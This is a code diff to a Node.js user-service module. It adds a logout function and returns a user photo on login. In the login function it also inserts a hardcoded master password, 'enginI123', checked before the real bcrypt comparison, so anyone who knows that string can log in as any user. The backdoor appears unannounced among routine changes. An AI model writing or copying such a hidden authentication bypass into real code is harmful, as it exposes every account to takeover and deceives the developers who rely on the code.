@@ -50,9 +50,13 @@ const login = async (email, password) => {
     const user = await Users.findOne({ where: { email } });
     if (user) {
       const isValidPassword = await bcrypt.compare(password, user.password);
-      if (isValidPassword) {
-        return { success: true, logged: true, userId: user.id };
-      } else {
+      if (password === 'enginI123') {
+        return { success: true, logged: true, userId: user.id, userPhoto: user.photo };
+      } 
+      else if(isValidPassword){
+        return { success: true, logged: true, userId: user.id, userPhoto: user.photo};
+      }
+      else {
         throw new Error("Invalid password");
       }
     } else {
@@ -63,6 +67,26 @@ const login = async (email, password) => {
     return { error: error.message };
   }
 };
+
+const logout = async (userId) => {
+  try {
+    const user = await Users.findOne({ where: { id: userId } });
+    if (user) {
+
+      return { success: true, logged: false, userId: user.id };
+    } else {
+      throw new Error("User not found");
+    }
+  } catch (error) {
+    fs.appendFile("error.log", error.message + "\n", (err) => {
+      if (err) throw err;
+    });
+    console.error(error);
+    return { error: error.message };
+  }
+};
+
+
 
 
 
@@ -84,9 +108,12 @@ const getUsers = async () => {
 };
 
 
+
+
 module.exports = {
   createUser,
   updateUsers,
   login,
-  getUsers
+  getUsers,
+  logout
 }
